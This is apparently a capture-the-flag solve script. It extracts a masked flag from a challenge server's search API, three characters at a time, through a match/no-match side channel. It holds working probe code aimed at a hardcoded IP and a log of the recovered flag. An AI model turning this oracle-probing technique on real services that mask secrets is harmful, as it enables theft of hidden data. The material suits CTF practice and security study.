"""
we can only query with 3 characters and the flag is replaced by *
luckily, the result of query will reflect that whether the letter we employed exist or not,
we can use this side-channel to probe the flag letter by letter.
[+] Starting probe with prefix: L3AK{
[+] Match found via "K{L" -> adding L to flag
[+] Match found via "{L3" -> adding 3 to flag
[+] Match found via "L3a" -> adding a to flag
[+] Match found via "3ak" -> adding k to flag
[+] Match found via "ak1" -> adding 1 to flag
[+] Match found via "k1n" -> adding n to flag
[+] Match found via "1ng" -> adding g to flag
[+] Match found via "ng_" -> adding _ to flag
[+] Match found via "g_t" -> adding t to flag
[+] Match found via "_th" -> adding h to flag
[+] Match found via "th3" -> adding 3 to flag
[+] Match found via "h3_" -> adding _ to flag
[+] Match found via "3_F" -> adding F to flag
[+] Match found via "_Fl" -> adding l to flag
[+] Match found via "Fl4" -> adding 4 to flag
[+] Match found via "l4g" -> adding g to flag
[+] Match found via "4g?" -> adding ? to flag
[+] Match found via "g??" -> adding ? to flag
[+] Match found via "??}" -> adding } to flag
flag: L3AK{L3ak1ng_th3_Fl4g??}
"""

import requests
import string

URL = "http://34.134.162.213:17000/api/search"
KNOWN = "L3AK{"
PROBESETS = string.printable.strip()

print(f"[+] Starting probe with prefix: {KNOWN}")

while not KNOWN.endswith("}"):
    found = False
    for c in PROBESETS:
        probe = (KNOWN + c)[-3:]  # use last 3 characters
        r = requests.post(URL, json={"query": probe})
        result = r.json()

        # filter out successful match of the part flag
        for post in result.get("results", []):
            if "*" in post["content"]:
                print(f'[+] Match found via "{probe}" -> adding {c} to flag')
                KNOWN += c
                found = True
                break
        if found:
            break  # to find next one

    if not found:
        print("[-] No matching character found - maybe charset is wrong or flag ended.")
        break

print(f"flag: {KNOWN}")
